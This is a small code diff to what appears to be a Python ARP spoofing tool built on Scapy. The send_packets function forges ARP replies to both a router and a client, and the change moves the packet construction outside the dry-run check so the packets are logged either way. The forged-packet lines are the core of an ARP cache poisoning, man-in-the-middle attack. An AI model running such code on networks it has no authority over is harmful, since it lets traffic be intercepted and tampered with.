@@ -53,12 +53,12 @@ def read_config(filename):
 
 def send_packets(router_ip, client_ip, router_mac, client_mac, dry):
     """Sends ARP packets to router and client"""
+    arpspoofed = ARP(op=2, psrc=router_ip, pdst=client_ip, hwdst=router_mac)
     if not dry:
-        arpspoofed = ARP(op=2, psrc=router_ip, pdst=client_ip, hwdst=router_mac)
         send(arpspoofed)
     logging.debug(arpspoofed)
+    arpspoofed = ARP(op=2, psrc=client_ip, pdst=router_ip, hwdst=client_mac)
     if not dry:
-        arpspoofed = ARP(op=2, psrc=client_ip, pdst=router_ip, hwdst=client_mac)
         send(arpspoofed)
     logging.debug(arpspoofed)
 
@@ -126,7 +126,5 @@ def main():
 
 
 if __name__ == '__main__':
-    nonbuffered_stdout = os.fdopen(sys.stdout.fileno(), 'w', 0)
-    sys.stdout = nonbuffered_stdout
     signal(SIGINT, handler)
     main()
